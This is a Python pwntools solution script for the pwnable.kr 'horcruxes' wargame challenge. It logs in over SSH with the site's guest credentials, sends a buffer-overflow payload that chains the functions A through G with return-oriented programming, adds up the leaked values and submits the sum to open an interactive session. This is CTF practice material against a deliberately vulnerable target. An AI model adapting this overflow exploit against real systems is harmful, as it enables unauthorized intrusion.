from pwn import *

context(log_level="debug", arch="amd64", os="linux")
sh = ssh(user="horcruxes", host="pwnable.kr", port=2222, password="guest")
p = sh.remote("0", 9032)

elf = ELF("./horcruxes")
A = elf.symbols["A"]
B = elf.symbols["B"]
C = elf.symbols["C"]
D = elf.symbols["D"]
E = elf.symbols["E"]
F = elf.symbols["F"]
G = elf.symbols["G"]
ropme = 0x0809fffc

payload = b"a" * 0x78 + p32(A) + p32(B) + p32(C) + p32(D) + p32(E) + p32(F) + p32(G) + p32(ropme)
p.sendlineafter("Select Menu:", b"1")
p.sendlineafter("How many EXP did you earned? : ", payload)
p.recvline()

sum = 0
for _ in range(7):
    sum += int(re.findall("\+(.\w+)", str(p.recvline(), encoding="utf-8"))[0])
p.sendlineafter("Select Menu:", b"1")
p.sendlineafter("How many EXP did you earned? : ", str(sum))
p.interactive()